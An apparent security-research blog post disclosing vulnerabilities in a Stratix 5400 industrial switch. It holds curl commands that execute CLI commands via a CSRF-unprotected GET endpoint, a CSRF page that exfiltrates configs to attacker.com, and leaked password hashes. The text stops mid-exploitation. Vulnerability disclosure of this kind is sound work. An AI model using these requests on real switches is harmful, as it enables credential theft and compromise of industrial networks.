@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Security assessment uncovering GET-based authenticated RCE with no CSRF protection, password hash exposure, and privilege escalation in industrial Ethernet switches">
+<title>Critical Vulnerabilities in Cisco Stratix 5400: GET-Based RCE and Complete Attack Chain</title>
+
+<link rel='canonical' href='https://blog.ics.red/posts/stratix-5400-research/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Critical Vulnerabilities in Cisco Stratix 5400: GET-Based RCE and Complete Attack Chain">
+<meta property='og:description' content="Security assessment uncovering GET-based authenticated RCE with no CSRF protection, password hash exposure, and privilege escalation in industrial Ethernet switches">
+<meta property='og:url' content='https://blog.ics.red/posts/stratix-5400-research/'>
+<meta property='og:site_name' content='Stephen&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:published_time' content='2025-11-22T12:00:00-05:00'/><meta property='article:modified_time' content='2025-11-22T12:00:00-05:00'/>
+<meta name="twitter:title" content="Critical Vulnerabilities in Cisco Stratix 5400: GET-Based RCE and Complete Attack Chain">
+<meta name="twitter:description" content="Security assessment uncovering GET-based authenticated RCE with no CSRF protection, password hash exposure, and privilege escalation in industrial Ethernet switches">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/me_hu9897367517360936995.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Stephen&#39;s blog</a></h1>
+            <h2 class="site-description">Student | OSCP&#43;, CRTO, CCNA</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/ladderlogix'
+                        target="_blank"
+                        title="Github"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linkedin.com/in/stephenglombicki'
+                        target="_blank"
+                        title="linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="32" height="32" viewBox="0 0 32 32">
+<path d="M 8.6425781 4 C 7.1835781 4 6 5.181625 6 6.640625 C 6 8.099625 7.182625 9.3085938 8.640625 9.3085938 C 10.098625 9.3085938 11.283203 8.099625 11.283203 6.640625 C 11.283203 5.182625 10.101578 4 8.6425781 4 z M 21.535156 11 C 19.316156 11 18.0465 12.160453 17.4375 13.314453 L 17.373047 13.314453 L 17.373047 11.310547 L 13 11.310547 L 13 26 L 17.556641 26 L 17.556641 18.728516 C 17.556641 16.812516 17.701266 14.960938 20.072266 14.960938 C 22.409266 14.960937 22.443359 17.145609 22.443359 18.849609 L 22.443359 26 L 26.994141 26 L 27 26 L 27 17.931641 C 27 13.983641 26.151156 11 21.535156 11 z M 6.3632812 11.310547 L 6.3632812 26 L 10.923828 26 L 10.923828 11.310547 L 6.3632812 11.310547 z"></path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/page/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/blog/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/ics-projects/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>ICS Projects</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#executive-summary">Executive Summary</a>
+      <ul>
+        <li><a href="#key-findings">Key Findings</a></li>
+      </ul>
+    </li>
+    <li><a href="#background-the-cisco-stratix-5400">Background: The Cisco Stratix 5400</a></li>
+    <li><a href="#critical-finding-1-get-based-remote-code-execution-no-csrf-protection">Critical Finding #1: GET-Based Remote Code Execution (No CSRF Protection)</a>
+      <ul>
+        <li><a href="#the-vulnerability">The Vulnerability</a></li>
+        <li><a href="#technical-details">Technical Details</a></li>
+        <li><a href="#proof-of-concept">Proof of Concept</a></li>
+        <li><a href="#confirmed-working-commands">Confirmed Working Commands</a></li>
+        <li><a href="#impact">Impact</a></li>
+      </ul>
+    </li>
+    <li><a href="#critical-finding-2-csrf-leading-to-unauthenticated-rce">Critical Finding #2: CSRF Leading to Unauthenticated RCE</a>
+      <ul>
+        <li><a href="#the-vulnerability-1">The Vulnerability</a></li>
+        <li><a href="#attack-scenario">Attack Scenario</a></li>
+        <li><a href="#proof-of-concept-1">Proof of Concept</a></li>
+        <li><a href="#impact-1">Impact</a></li>
+      </ul>
+    </li>
+    <li><a href="#critical-finding-3-password-hash-exposure">Critical Finding #3: Password Hash Exposure</a>
+      <ul>
+        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-complete-attack-chain">The Complete Attack Chain</a>
+      <ul>
+        <li><a href="#phase-1-initial-access">Phase 1: Initial Access</a></li>
+        <li><a href="#phase-2-information-disclosure">Phase 2: Information Disclosure</a></li>
+        <li><a href="#phase-3-offline-password-cracking">Phase 3: Offline Password Cracking</a></li>
+        <li><a href="#phase-4-admin-access">Phase 4: Admin Access</a></li>
+        <li><a href="#phase-5-remote-code-execution">Phase 5: Remote Code Execution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ics-security/" >
+                ICS Security
+            </a>
+        
+            <a href="/categories/research/" >
+                Research
+            </a>
+        
+            <a href="/categories/vulnerability-research/" >
+                Vulnerability Research
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/stratix-5400-research/">Critical Vulnerabilities in Cisco Stratix 5400: GET-Based RCE and Complete Attack Chain</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Security assessment uncovering GET-based authenticated RCE with no CSRF protection, password hash exposure, and privilege escalation in industrial Ethernet switches
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 22, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="executive-summary">Executive Summary
+</h2><p>While playing around with a Rockwell Stratix 5400 industrial Ethernet switch, I uncovered a series of  <strong>vulnerabilities</strong> that, when chained together, allow complete device compromise with minimal effort.</p>
+<h3 id="key-findings">Key Findings
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>Vulnerability</th>
+          <th>Impact</th>
+          <th>Exploitability</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>GET-Based RCE (No CSRF)</strong></td>
+          <td>Full command execution</td>
+          <td>Trivial - single HTTP GET</td>
+      </tr>
+      <tr>
+          <td><strong>CSRF to RCE</strong></td>
+          <td>Unauthenticated → RCE via CSRF</td>
+          <td>Easy - malicious webpage</td>
+      </tr>
+      <tr>
+          <td><strong>Password Hash Exposure</strong></td>
+          <td>Complete credential disclosure</td>
+          <td>Trivial - view HTML source</td>
+      </tr>
+      <tr>
+          <td><strong>Privilege Escalation Chain</strong></td>
+          <td>Read-only → Admin escalation</td>
+          <td>Easy - hash cracking</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><img src="/posts/stratix-5400-research/switchinsetup.jpg"
+	width="1200"
+	height="1600"
+	srcset="/posts/stratix-5400-research/switchinsetup_hu12109041322939418767.jpg 480w, /posts/stratix-5400-research/switchinsetup_hu7654611312631876348.jpg 1024w"
+	loading="lazy"
+	
+		alt="Cisco Stratix 5400 Switch"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="75"
+		data-flex-basis="180px"
+	
+></p>
+<p><em>Cisco Stratix 5400 Industrial Ethernet Switch - commonly deployed in critical infrastructure</em></p>
+<h2 id="background-the-cisco-stratix-5400">Background: The Cisco Stratix 5400
+</h2><p>The Cisco Stratix 5400 is an <strong>industrial-grade Ethernet switch</strong> designed for harsh environments including manufacturing facilities, utilities, oil &amp; gas operations, and transportation systems.</p>
+<p><strong>Target Device Specifications:</strong></p>
+<ul>
+<li><strong>Model:</strong> 1783-BMS10CGP</li>
+</ul>
+<hr>
+<h2 id="critical-finding-1-get-based-remote-code-execution-no-csrf-protection">Critical Finding #1: GET-Based Remote Code Execution (No CSRF Protection)
+</h2><h3 id="the-vulnerability">The Vulnerability
+</h3><p>The web interface exposes a <strong>GET-based command execution endpoint</strong> that accepts arbitrary CLI commands <strong>without CSRF token protection</strong>:</p>
+<pre tabindex="0"><code>Endpoint: /%24{variable}%0A?{variable}=&lt;command&gt;
+Method: GET
+Authentication: Required (HTTP Basic Auth)
+CSRF Protection: NONE 
+</code></pre><h3 id="technical-details">Technical Details
+</h3><p>The endpoint uses URL-encoded variable substitution:</p>
+<ul>
+<li><code>%24</code> = <code>$</code> (dollar sign)</li>
+<li><code>%0A</code> = <code>\n</code> (newline)</li>
+<li><strong>Any variable name works</strong>: <code>a</code>, <code>b</code>, <code>c</code>, <code>d</code>, <code>cmd</code>, <code>command</code>, etc.</li>
+</ul>
+<p><strong>Working pattern discovered:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /%24b%0A?b=show%20running-config <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">192.168.103.143</span>
+</span></span><span style="display:flex;"><span>Authorization<span style="color:#f92672">:</span> <span style="color:#ae81ff">Basic YWRtaW46U3RlcGhlbjEz</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Response: 200 OK
+</span></span><span style="display:flex;"><span>Content-Length: 4700
+</span></span><span style="display:flex;"><span>[Full device configuration with passwords]
+</span></span></code></pre></div><p><em>Screenshot showing the GET-based RCE endpoint pattern</em></p>
+<h3 id="proof-of-concept">Proof of Concept
+</h3><p><strong>Simple cURL command:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -u admin:Stephen13 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;https://192.168.103.143/%24b%0A?b=show%20version%20|%20include%20uptime&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns:</span>
+</span></span><span style="display:flex;"><span>stratix uptime is <span style="color:#ae81ff">11</span> hours, <span style="color:#ae81ff">42</span> minutes
+</span></span></code></pre></div><p><img src="/posts/stratix-5400-research/examplerce.png"
+	width="836"
+	height="425"
+	srcset="/posts/stratix-5400-research/examplerce_hu6238255412799192376.png 480w, /posts/stratix-5400-research/examplerce_hu13137390444415447660.png 1024w"
+	loading="lazy"
+	
+		alt="Successful RCE Execution"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="196"
+		data-flex-basis="472px"
+	
+></p>
+<p><em>Terminal showing successful command execution via the GET-based RCE endpoint</em></p>
+<h3 id="confirmed-working-commands">Confirmed Working Commands
+</h3><p>All tested commands execute successfully:</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>Command</th>
+          <th>Output Size</th>
+          <th>Sensitive Data</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>show running-config</code></td>
+          <td>4,700 bytes</td>
+          <td>✅ Passwords, SNMP strings, network config</td>
+      </tr>
+      <tr>
+          <td><code>show startup-config</code></td>
+          <td>3,354 bytes</td>
+          <td>✅ Saved configuration</td>
+      </tr>
+      <tr>
+          <td><code>show version</code></td>
+          <td>2,921 bytes</td>
+          <td>✅ IOS version, serial numbers</td>
+      </tr>
+      <tr>
+          <td><code>show users</code></td>
+          <td>142 bytes</td>
+          <td>✅ Active sessions</td>
+      </tr>
+      <tr>
+          <td><code>show ip interface brief</code></td>
+          <td>820 bytes</td>
+          <td>✅ Network topology</td>
+      </tr>
+      <tr>
+          <td><code>dir flash:</code></td>
+          <td>1,113 bytes</td>
+          <td>✅ File system contents</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>All &ldquo;show&rdquo; commands work. Configuration commands return errors (as expected for GET requests).</strong></p>
+<h3 id="impact">Impact
+</h3><ul>
+<li><strong>Complete information disclosure</strong>: All device configuration, passwords, network topology</li>
+<li><strong>Reconnaissance</strong>: Full network mapping from a single device</li>
+<li><strong>Credential harvesting</strong>: SNMP community strings, enable passwords, user accounts</li>
+<li><strong>Compliance violation</strong>: PCI-DSS, NIST, IEC 62443 requirements</li>
+</ul>
+<hr>
+<h2 id="critical-finding-2-csrf-leading-to-unauthenticated-rce">Critical Finding #2: CSRF Leading to Unauthenticated RCE
+</h2><h3 id="the-vulnerability-1">The Vulnerability
+</h3><p>Because the RCE endpoint uses <strong>GET requests with no CSRF token</strong>, any webpage can trigger command execution when visited by an authenticated administrator.</p>
+<h3 id="attack-scenario">Attack Scenario
+</h3><ol>
+<li>Attacker creates malicious webpage</li>
+<li>Sends link to network administrator: &ldquo;Check out this network diagnostic tool!&rdquo;</li>
+<li>Admin clicks link while logged into switch web interface</li>
+<li>Malicious JavaScript executes commands in admin&rsquo;s browser context</li>
+<li>Full device configuration exfiltrated to attacker&rsquo;s server</li>
+<li>Admin sees &ldquo;Diagnostics complete!&rdquo; - never suspects attack</li>
+</ol>
+<h3 id="proof-of-concept-1">Proof of Concept
+</h3><p><strong>Malicious webpage (csrf_rce_exploit.html):</strong></p>
+<p><strong>I was unable to fully test this exploit out as I kept running into issues with having two new of a browser and didnt want to sink more time in proving it</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Network Equipment Diagnostics Tool&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;🔧 Network Equipment Diagnostics&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;Running automated diagnostics...&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;status&#34;</span>&gt;Scanning...&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Hidden CSRF attacks --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://192.168.103.143/%24b%0A?b=show%20running-config&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display:none&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Exfiltrate stolen data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">stealData</span>(<span style="color:#a6e22e">command</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://192.168.103.143/%24b%0A?b=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">command</span>), {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>  <span style="color:#75715e">// Send session cookies
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Send to attacker&#39;s server
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/collect&#39;</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">target</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;192.168.103.143&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">command</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">command</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">output</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>
+</span></span><span style="display:flex;"><span>                })
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Execute multiple attacks
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">stealData</span>(<span style="color:#e6db74">&#39;show running-config&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stealData</span>(<span style="color:#e6db74">&#39;show startup-config&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stealData</span>(<span style="color:#e6db74">&#39;show version&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stealData</span>(<span style="color:#e6db74">&#39;dir flash:&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;status&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;✓ Diagnostics complete!&#39;</span>;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><strong>Attack outcome:</strong></p>
+<ul>
+<li>Full device configuration stolen</li>
+<li>All credentials exfiltrated</li>
+<li>Network topology revealed</li>
+<li><strong>No user interaction beyond clicking link</strong></li>
+<li>No visible evidence of attack</li>
+</ul>
+<h3 id="impact-1">Impact
+</h3><ul>
+<li><strong>Unauthenticated to RCE</strong>: Attacker doesn&rsquo;t need credentials, just needs admin to visit webpage</li>
+<li><strong>Mass exploitation</strong>: Single malicious webpage can attack all administrators who visit it</li>
+<li><strong>Stealth</strong>: No logs, no alerts, admin sees &ldquo;legitimate&rdquo; diagnostic tool</li>
+<li><strong>Supply chain attack</strong>: Could be embedded in compromised vendor tools/documentation</li>
+</ul>
+<hr>
+<h2 id="critical-finding-3-password-hash-exposure">Critical Finding #3: Password Hash Exposure
+</h2><p>The <code>useraccounts.shtml</code> page includes a hidden textarea that contains the output of Server-Side Include (SSI) commands, exposing all user account password hashes in the HTML source code.</p>
+<h3 id="vulnerable-code">Vulnerable Code
+</h3><p><strong>File: <code>useraccounts.shtml</code> (Lines 693-706)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display:none; visibility:hidden;&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_SUMMARY&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--#exec cmd=&#39;more system:running-config | i user&#39;--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">textarea</span>&gt;
+</span></span></code></pre></div><p>When rendered, this becomes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display:none; visibility:hidden;&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_SUMMARY&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>username admin privilege 15 secret 5 $1$P4Bi$8t74cAAknpCiVCvL7IC6T.
+</span></span><span style="display:flex;"><span>username vulntest privilege 5 secret 9 $9$wLzi8Cmi6aH91k$qOAH1kOzmLhTX1tKqGx/BMhZ.2x3lvdlck6l3ES8.1.
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">textarea</span>&gt;
+</span></span></code></pre></div><p><img src="/posts/stratix-5400-research/hashleak.png"
+	width="1552"
+	height="206"
+	srcset="/posts/stratix-5400-research/hashleak_hu9168787486100869449.png 480w, /posts/stratix-5400-research/hashleak_hu13994499626064948689.png 1024w"
+	loading="lazy"
+	
+		alt="Password Hash Exposure"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="753"
+		data-flex-basis="1808px"
+	
+></p>
+<p><em>Screenshot showing admin password hash visible in page source to read-only user</em></p>
+<h3 id="exploitation">Exploitation
+</h3><p><strong>Step 1: Access page (even as read-only user)</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -u vulntest:vulntest https://192.168.103.143/useraccounts.shtml
+</span></span></code></pre></div><p><strong>Step 2: View HTML source</strong></p>
